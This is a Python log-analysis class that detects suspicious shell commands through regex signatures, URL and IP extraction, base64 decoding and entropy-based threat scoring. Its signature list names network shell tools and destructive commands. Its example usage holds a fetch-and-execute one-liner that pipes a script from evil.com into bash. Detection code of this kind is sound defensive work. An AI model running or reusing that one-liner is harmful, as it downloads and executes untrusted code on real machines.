import re
import base64
from math import log2
from typing import List, Dict, Any


class AdvancedCommandDetector:
    """
    Advanced Cyber Defense Log Analyzer:
    - Regex signature detection
    - Base64 payload detection with safe decoding
    - Entropy scoring (detects obfuscation)
    - Command injection heuristics
    - Lightweight anomaly scoring
    """

    # --- Stage 1 — Suspicious command signatures ---
    signature_patterns = [
        r"\bcurl\b",
        r"\bwget\b",
        r"\bnc\b",
        r"\bncat\b",
        r"\bnmap\b",
        r"\bssh\b",
        r"bash\s+-c",
        r"\bpowershell\b",
        r"\bpython\s+-c\b",
        r"\bphp\s+-r\b",
        r"\beval\b",
        r"\bexec\b",
        r"rm\s+-rf",
        r"chmod\s+777",
        r"/dev/tcp/",
        r";\s*",
        r"\|\s*",
        r"&\s*",
        r"`.+?`",             # command substitution
        r"\$\(.+?\)",         # command substitution
    ]

    # --- Stage 2 — Indicators / Artifacts ---
    url_pattern = re.compile(r"https?://[^\s]+", re.IGNORECASE)
    ip_pattern = re.compile(r"\b\d{1,3}(?:\.\d{1,3}){3}\b")
    b64_pattern = re.compile(r"[A-Za-z0-9+/]{12,}={0,2}")

    def __init__(self):
        self.compiled_signatures = [(p, re.compile(p, re.IGNORECASE)) for p in self.signature_patterns]

    # -------------------------------------------------------------------
    # ENTROPY HELPER — high entropy indicates encoded payloads or malware
    # -------------------------------------------------------------------

    def shannon_entropy(self, data: str) -> float:
        if not data:
            return 0.0
        freq = {c: data.count(c) for c in set(data)}
        entropy = -sum((count / len(data)) * log2(count / len(data)) for count in freq.values())
        return round(entropy, 3)

    # -------------------------------------------------------------------
    # SAFE BASE64 DECODER
    # -------------------------------------------------------------------

    def safe_decode_base64(self, text: str) -> str:
        try:
            padded = text + "=" * ((4 - len(text) % 4) % 4)
            decoded = base64.b64decode(padded, validate=False)
            return decoded.decode("utf-8", errors="ignore")
        except Exception:
            return ""

    # -------------------------------------------------------------------
    # MAIN ANALYSIS PIPELINE
    # -------------------------------------------------------------------

    def analyze(self, log_line: str) -> Dict[str, Any]:
        result = {
            "line": log_line,
            "signatures": [],
            "urls": [],
            "ips": [],
            "base64_segments": [],
            "decoded_payloads": [],
            "entropy_score": 0.0,
            "threat_score": 0,
        }

        # ---- Stage A: Signature detection ----
        for sig_str, sig_re in self.compiled_signatures:
            match = sig_re.search(log_line)
            if match:
                result["signatures"].append({
                    "pattern": sig_str,
                    "match": match.group(0),
                })

        # ---- Stage B: URL + IP extraction ----
        result["urls"] = self.url_pattern.findall(log_line)
        result["ips"] = self.ip_pattern.findall(log_line)

        # ---- Stage C: Base64 detection ----
        b64_matches = self.b64_pattern.findall(log_line)
        for segment in b64_matches:
            result["base64_segments"].append(segment)
            decoded = self.safe_decode_base64(segment)
            if decoded:
                result["decoded_payloads"].append(decoded)

        # ---- Stage D: Entropy scoring ----
        result["entropy_score"] = self.shannon_entropy(log_line)

        # ---- Stage E: Threat scoring ----
        result["threat_score"] = self.compute_threat_score(result)

        return result

    # -------------------------------------------------------------------
    # Threat scoring logic
    # -------------------------------------------------------------------

    def compute_threat_score(self, data: Dict[str, Any]) -> int:
        score = 0

        score += len(data["signatures"]) * 10
        score += len(data["urls"]) * 10
        score += len(data["ips"]) * 5
        score += len(data["decoded_payloads"]) * 15

        # entropy thresholds
        if data["entropy_score"] > 4.0:
            score += 15
        if data["entropy_score"] > 5.0:
            score += 20

        # Cap at 100
        return min(score, 100)


# Example Usage
if __name__ == "__main__":
    detector = AdvancedCommandDetector()
    log = "bash -c \"curl http://evil.com/p.sh | base64 -d | bash\""
    result = detector.analyze(log)

    from pprint import pprint
    pprint(result)
